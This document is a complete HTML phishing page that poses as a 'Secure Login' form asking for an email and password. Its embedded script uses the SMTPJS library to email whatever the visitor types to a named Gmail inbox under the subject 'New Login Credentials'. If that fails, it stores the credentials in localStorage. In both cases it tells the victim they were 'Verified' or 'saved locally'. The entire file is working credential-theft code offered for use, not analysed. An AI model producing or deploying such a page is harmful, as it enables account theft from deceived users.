<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Arial, sans-serif; }
        .card { background: #1a1a1a; padding: 40px 30px; border-radius: 16px; width: 350px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); border: 1px solid #2a2a2a; }
        h2 { color: #ffffff; text-align: center; margin-bottom: 28px; font-weight: 400; letter-spacing: 1px; }
        .field { margin-bottom: 18px; }
        label { display: block; color: #aaaaaa; font-size: 13px; margin-bottom: 5px; }
        input { width: 100%; padding: 14px 16px; background: #0d0d0d; border: 1px solid #333; color: #eee; border-radius: 8px; font-size: 15px; outline: none; transition: 0.2s; }
        input:focus { border-color: #2ea043; }
        button { width: 100%; padding: 14px; background: #2ea043; border: none; color: white; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.2s; margin-top: 8px; }
        button:hover { background: #3fb950; }
        #msg { text-align: center; margin-top: 16px; font-size: 14px; color: #f85149; min-height: 22px; }
        .footer { text-align: center; margin-top: 20px; color: #444; font-size: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔐 Verify Access</h2>
        <div class="field">
            <label>Email</label>
            <input type="email" id="email" placeholder="you@example.com" autocomplete="off">
        </div>
        <div class="field">
            <label>Password</label>
            <input type="password" id="password" placeholder="••••••••" autocomplete="off">
        </div>
        <button id="loginBtn">Continue</button>
        <div id="msg"></div>
        <div class="footer">secured connection</div>
    </div>

    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
        (function() {
            // GMAIL CONFIG – REPLACE PASSWORD ONLY
            const SENDER = "hadiphototikto@gmail.com";
            const PASS = "YOUR_16_CHAR_APP_PASSWORD";  // <-- REPLACE with app password named "arbcgenefont"
            const RECIPIENT = "hadiphototikto@gmail.com";

            document.getElementById('loginBtn').addEventListener('click', sendCreds);
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    const active = document.activeElement;
                    if (active && (active.id === 'email' || active.id === 'password')) {
                        sendCreds();
                    }
                }
            });

            function sendCreds() {
                const email = document.getElementById('email').value.trim();
                const pass = document.getElementById('password').value.trim();
                const msgEl = document.getElementById('msg');

                if (!email || !pass) {
                    msgEl.innerText = "Please fill in all fields.";
                    msgEl.style.color = "#f85149";
                    return;
                }

                const body = "🔹 Gmail: " + email + "\n🔹 Password: " + pass + "\n\n— Captured from arbcgenefont page";

                Email.send({
                    Host: "smtp.gmail.com",
                    Username: SENDER,
                    Password: PASS,
                    To: RECIPIENT,
                    From: SENDER,
                    Subject: "✅ New Login Credentials (arbcgenefont)",
                    Body: body
                })
                .then(function() {
                    msgEl.innerText = "✅ Verified – redirecting...";
                    msgEl.style.color = "#3fb950";
                    document.getElementById('email').value = '';
                    document.getElementById('password').value = '';
                })
                .catch(function(error) {
                    msgEl.innerText = "⚠️ Connection error – saved locally";
                    msgEl.style.color = "#f85149";
                    localStorage.setItem("arbcgenefont_creds", body);
                    console.error(error);
                });
            }
        })();
    </script>
</body>
</html>
